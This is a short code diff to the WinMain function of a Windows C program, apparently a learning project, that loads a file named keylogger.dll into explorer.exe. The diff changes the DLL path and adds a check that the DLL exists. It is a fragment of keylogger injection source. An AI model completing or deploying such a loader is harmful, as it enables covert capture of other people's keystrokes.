@@ -68,12 +68,18 @@ int WINAPI	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	(void)hPrevInstance;
 	(void)lpCmdLine;
 	(void)nShowCmd;
-	const wchar_t* dllPath = L"C:\\Users\\Celeste\\Documents\\tinkyWinkey\\keylogger.dll";
+	const wchar_t* dllPath = L"C:\\Users\\Michel\\Documents\\Craft\\TinkyWinkey\\keylogger.dll"; // Change this to your DLL path
 	const wchar_t* targetProcess = L"explorer.exe";
 
 	HANDLE fd = create_log_file();
 	if (fd == NULL)
 		return 1;
+
+	if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES)
+	{
+		write_logs("DLL not found in the current directory.\n", fd);
+		return 1;
+	}
 
 	// Find the target process ID
 	DWORD pid = FindTargetPID(targetProcess);
